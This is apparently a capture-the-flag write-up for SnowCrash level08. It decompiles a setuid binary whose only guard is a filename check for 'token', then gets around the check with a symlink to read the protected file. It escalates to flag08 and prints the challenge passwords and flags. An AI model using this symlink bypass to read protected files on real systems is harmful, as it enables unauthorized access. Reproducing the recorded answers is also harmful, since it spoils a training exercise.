we notice two files in the home directory

```shell
level08@SnowCrash:~$ ls -al
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

we cant read read the contents of the `token` file
```shell
level08@SnowCrash:~$ cat token
cat: token: Permission denied
```

using binary ninja we to inspect the source code of the `level08` binary, we fined the following snippet

```C
int32_t main(int argc, char** argv, char** envp)
{
    char** envp_1 = envp;
    void* gsbase;
    int32_t eax_2 = *(gsbase + 0x14);

    if (argc == 1)
    {
        printf("%s [file to read]\n", *argv);
        exit(1);
        /* no return */
    }

    if (strstr(argv[1], "token"))
    {
        printf("You may not access '%s'\n", argv[1]);
        exit(1);
        /* no return */
    }

    int32_t fd = open(argv[1], 0);

    if (fd == 0xffffffff)
    {
        err(1, "Unable to open %s", argv[1]);
        /* no return */
    }

    void buf;
    ssize_t nbytes = read(fd, &buf, 0x400);

    if (nbytes == 0xffffffff)
    {
        err(1, "Unable to read fd %d", fd);
        /* no return */
    }

    ssize_t result = write(1, &buf, nbytes);

    if (eax_2 == *(gsbase + 0x14))
        return result;

    __stack_chk_fail();
    /* no return */
}
```

looks like the program takes a file path and reads it's content and writes it to the standard output, but only if the file name is not `token`

we can exploit this behavior using the following command
```shell
level08@SnowCrash:~$ ln -s $(realpath token) /tmp/symlink
level08@SnowCrash:~$ ls -la /tmp/symlink
lrwxrwxrwx 1 level08 level08 24 Apr 19 23:17 /tmp/symlink -> /home/user/level08/token
```

now all we have to do is pass the sumlink to out program
```shell
level08@SnowCrash:~$ ./level08 /tmp/symlink
quif5eloekouj29ke0vouxean
```

now lets get the flag
```shell
level08@SnowCrash:~$ su flag08
Password: quif5eloekouj29ke0vouxean
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

on to the next challenge
